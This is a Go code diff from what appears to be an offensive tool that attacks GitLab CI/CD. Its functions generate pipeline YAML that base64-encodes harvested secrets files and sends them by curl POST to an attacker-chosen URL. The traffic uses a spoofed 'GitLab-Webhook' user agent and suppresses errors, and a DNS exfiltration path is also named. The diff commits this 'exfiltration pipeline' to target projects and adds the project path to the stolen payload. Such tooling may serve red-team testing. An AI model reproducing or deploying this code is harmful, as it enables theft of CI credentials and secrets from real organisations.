@@ -5,6 +5,7 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"fmt"
+	"log/slog"
 	"strings"
 
 	gitlab "gitlab.com/gitlab-org/api/client-go"
@@ -101,9 +102,9 @@ func exfilScriptStep(exfil ExfilOptions, encrypted bool) string {
 
 func exfilHTTP(target string, encrypted bool) string {
 	if encrypted {
-		return fmt.Sprintf("\n    - |\n      enc_b64=$(base64 -w0 secrets.enc)\n      key_b64=$(base64 -w0 aes.enc)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"payload\\\":\\\"$enc_b64\\\",\\\"key\\\":\\\"$key_b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true", target)
+		return fmt.Sprintf("\n    - |\n      enc_b64=$(base64 -w0 secrets.enc)\n      key_b64=$(base64 -w0 aes.enc)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"payload\\\":\\\"$enc_b64\\\",\\\"key\\\":\\\"$key_b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\",\\\"project\\\":\\\"$CI_PROJECT_PATH\\\"}\" \\\n        \"%s\" || true", target)
 	}
-	return fmt.Sprintf("\n    - |\n      b64=$(base64 -w0 secrets.json)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true", target)
+	return fmt.Sprintf("\n    - |\n      b64=$(base64 -w0 secrets.json)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\",\\\"project\\\":\\\"$CI_PROJECT_PATH\\\"}\" \\\n        \"%s\" || true", target)
 }
 
 func exfilDNS(domain string) string {
@@ -140,12 +141,14 @@ func (s *SecretsAttack) RunExfil(ctx context.Context, projectID any, branch, pub
 	if _, err = s.SetupUser(ctx); err != nil {
 		return "", "", err
 	}
-	// Ensure a job name is set before generating so we can return it to the caller.
 	if strings.TrimSpace(exfil.JobName) == "" {
 		exfil.JobName = GenerateExfilJobName()
 	}
 	yaml := s.GenerateExfilCI(branch, pubkey, runnerTags, exfil)
 	url, err = s.CommitCIPipeline(ctx, projectID, branch, yaml, "Add exfiltration pipeline")
+	if err == nil {
+		slog.Info("exfil pipeline committed", "project", projectID, "branch", branch, "method", exfil.Method, "job", exfil.JobName)
+	}
 	return url, exfil.JobName, err
 }
 
